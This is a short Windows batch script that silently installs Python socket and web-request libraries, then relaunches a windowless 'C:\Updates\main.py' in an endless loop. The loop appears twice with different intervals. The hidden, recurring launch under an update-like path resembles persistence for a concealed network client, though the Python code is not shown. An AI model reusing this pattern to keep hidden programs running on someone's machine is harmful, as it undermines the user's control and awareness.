setlocal
pip show python-socketio >nul 2>nul
if errorlevel 1 (
    echo Installing python-socketio...
    pip install python-socketio -q
) else (
    echo python-socketio is already installed.
)
pip show websocket-client >nul 2>nul
if errorlevel 1 (
    echo Installing websocket-client...
    pip install websocket-client -q
) else (
    echo websocket-client is already installed.
)
pip show requests >nul 2>nul
if errorlevel 1 (
    echo Installing requests...
    pip install requests -q
) else (
    echo requests is already installed.
)
endlocal
@echo off
:loop
pythonw C:\Updates\main.py
timeout /t 300
goto loop

@echo off
:loop
pythonw C:\Updates\main.py
timeout /t 1000
goto loop
